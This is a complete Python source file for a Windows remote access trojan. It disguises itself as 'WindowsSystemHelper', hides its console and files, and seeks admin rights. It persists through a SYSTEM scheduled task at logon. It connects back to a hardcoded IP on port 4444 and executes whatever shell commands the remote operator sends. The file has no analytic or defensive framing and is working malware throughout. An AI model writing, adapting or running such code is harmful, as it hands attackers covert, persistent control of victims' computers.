import socket
import subprocess
import threading
import os
import sys
import time
import ctypes
import shutil

SERVER_HOST = '152.53.182.180'
SERVER_PORT = 4444
TASK_NAME = "WindowsSystemHelper"

def hide_itself():
    try:
        if getattr(sys, 'frozen', False):
            current = sys.executable
        else:
            current = os.path.abspath(sys.argv[0])
        
        hidden_dir = os.path.join(os.getenv('APPDATA'), 'WindowsHelper')
        os.makedirs(hidden_dir, exist_ok=True)
        target = os.path.join(hidden_dir, "WindowsSystemHelper.exe")
        
        if current != target:
            shutil.copy2(current, target)
            ctypes.windll.kernel32.SetFileAttributesW(target, 0x02 | 0x04)  # Hidden + System
            return target
        return current
    except:
        return None

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def request_admin():
    if is_admin():
        return True
    try:
        if getattr(sys, 'frozen', False):
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, None, None, 1)
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{os.path.abspath(sys.argv[0])}"', None, 1)
        sys.exit(0)
    except:
        return False

def create_persistent_task(exe_path):
    if not is_admin(): return False
    try:
        os.system(f'schtasks /delete /tn {TASK_NAME} /f >nul 2>&1')
        cmd = f'schtasks /create /tn {TASK_NAME} /tr "{exe_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
        return os.system(cmd) == 0
    except:
        return False

def hide_console():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def killer_thread():
    """Hidden killer: Type 'nic owns me' in any CMD to kill RAT"""
    while True:
        try:
            output = subprocess.getoutput('tasklist /fi "IMAGENAME eq cmd.exe" /v')
            if "nic owns me" in output.lower():
                print("[-] Kill command received. Terminating...")
                os.system(f'schtasks /delete /tn {TASK_NAME} /f >nul 2>&1')
                os._exit(0)
        except:
            pass
        time.sleep(3)

def connect_to_vps():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_HOST, SERVER_PORT))
            
            while True:
                cmd = client.recv(8192).decode('utf-8', errors='ignore').strip()
                if not cmd:
                    continue
                if cmd.lower() == 'exit':
                    client.close()
                    return
                
                try:
                    output = subprocess.getoutput(cmd)
                    client.send((output or '[+] Done').encode('utf-8', errors='ignore'))
                except:
                    client.send(b'Error')
        except:
            time.sleep(5)

if __name__ == "__main__":
    hide_console()
    
    if not is_admin():
        request_admin()
    
    protected_path = hide_itself()
    if protected_path:
        create_persistent_task(protected_path)

    # Start hidden killer
    threading.Thread(target=killer_thread, daemon=True).start()

    # Start RAT
    threading.Thread(target=connect_to_vps, daemon=True).start()

    while True:
        time.sleep(10)
